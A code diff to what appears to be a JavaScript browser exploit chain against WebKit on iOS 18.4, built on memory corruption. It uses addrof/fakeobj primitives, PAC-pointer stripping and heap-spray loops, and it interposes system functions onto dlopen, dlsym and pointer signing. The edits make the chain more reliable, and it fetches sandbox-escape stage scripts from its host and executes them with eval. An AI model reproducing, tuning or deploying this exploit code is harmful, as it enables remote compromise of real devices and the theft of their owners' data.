@@ -84,7 +84,7 @@ BigInt.prototype.hex = function() { let s = '0x' + this.toString(16); return s; 
 BigInt.prototype.asDouble = function() { u64[0] = this; return f64[0]; };
 BigInt.prototype.add = function(other) { return this + other; };
 BigInt.prototype.sub = function(other) { return this - other; }
-BigInt.prototype.noPAC = function() { return this & 0x7fffffffffn; }
+BigInt.prototype.noPAC = function() { return this & 0xffffffffffn; }
 BigInt.prototype.asInt32s = function() {
     u64[0] = this;
     let lo = u32[0];
@@ -8609,7 +8609,7 @@ async function _aarw_main() {
         })()
 
         async function _make_rw(p_rce, mk_stage1, verify = false) {
-            for (let i = 0; i < 20000; ++i) {
+            for (let i = 0; i < 100000; ++i) {
                 _f2i(i);
                 _i2f(i);
             }
@@ -9385,7 +9385,7 @@ const device_chipset = {
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
-          for (let i = 0; i < 500; ++i) {
+          for (let i = 0; i < 1000; ++i) {
             let o = {
               p1: 1.1,
               p2: 2.2
@@ -9396,6 +9396,10 @@ const device_chipset = {
             }
             scribbles.push(o);
             prev_addr = p.addrof(o);
+          }
+          if (!scribble_element) {
+            print("scribble_element: allocation stride miss after 1000 attempts");
+            throw new Error("scribble_element allocation failed");
           }
           let change_scribble_holder = {
             p1: p.fakeobj(0x108240700000000n),
@@ -9455,6 +9459,7 @@ const device_chipset = {
           };
           p.device_model = device_model;
           p.chipset = chipset;
+          p.sbx0_fallback_start = isFinite(globalThis.__ls_sbx0_fallback_start) ? globalThis.__ls_sbx0_fallback_start : 0;
           globalThis.device_model = p.device_model;
           p.offsets = offsets;
           p.slide = slide;
@@ -9788,11 +9793,16 @@ async function main() {
           p.efficient_search = function (begin, end, bytes) {
             const needle = String.fromCharCode(...bytes);
             const finder = p.create_jsstring(begin, end - begin);
+            const deadline = Date.now() + 5000;
             while (true) {
               const index = finder.indexOf(needle);
               if (index != -1) {
                 print(`index:${index}`);
                 return begin + BigInt(index);
+              }
+              if (Date.now() > deadline) {
+                print("efficient_search: timeout after 5s");
+                throw new Error("stack search timeout");
               }
             }
           };
@@ -9896,7 +9906,15 @@ async function main() {
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation, offsets.libdyld__dlopen);
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddCustomMetadata, offsets.libdyld__dlsym);
           interpose(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
-          while (p.read64(p.p_InterposeTupleAll_size) != 0x100n);
+          {
+            const deadline = Date.now() + 10000;
+            while (p.read64(p.p_InterposeTupleAll_size) != 0x100n) {
+              if (Date.now() > deadline) {
+                print("interpose spin-wait timeout after 10s");
+                throw new Error("interpose timeout");
+              }
+            }
+          }
           print('InterposeTupleAll.size has been written');
           const initMediaAccessibilityMACaptionAppearanceGetDisplayType = p.read64(offsets.WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType);
           print(`initMediaAccessibilityMACaptionAppearanceGetDisplayType: ${initMediaAccessibilityMACaptionAppearanceGetDisplayType.hex()}`);
@@ -10205,11 +10223,27 @@ async function main() {
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
-                const sbx0_script = getJS('/sbx0_main_18.4.js?' + Date.now());
+                const sbx1_prefetch = getJS('sbx1_main.js?' + Date.now());
+                if (sbx1_prefetch && sbx1_prefetch.length > 0) {
+                  p.prefetched_sbx1_script = sbx1_prefetch;
+                  log("[stage1_rce] prefetched sbx1_main.js bytes=" + sbx1_prefetch.length);
+                } else {
+                  log("[stage1_rce] sbx1_main.js prefetch returned empty");
+                }
+                const sbx0_script = getJS('sbx0_main_18.4.js?' + Date.now());
                 log("after get js");
                 eval(sbx0_script);
         } catch (e) {
-            log(btoa(e));
+            try {
+              log("[stage1_rce] sbx0 eval failed: " + e);
+              if (e && e.stack) log("[stage1_rce] sbx0 eval stack: " + e.stack);
+            } catch (_) {}
+            fcall_close();
+            self.postMessage({
+              type: 'stage1_failed',
+              error: e && e.stack ? e.stack.toString() : String(e)
+            });
+            return;
         }
           fcall_close();
           print(`all done`);
@@ -10227,6 +10261,8 @@ async function main() {
         {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
+            globalThis.__ls_sbx0_fallback_start = parseInt(data.sbx0_fallback_start, 10);
+            if (!isFinite(globalThis.__ls_sbx0_fallback_start)) globalThis.__ls_sbx0_fallback_start = 0;
             print("inside stage1_rce from worker");
             (async () => {
               let p_temp = null;
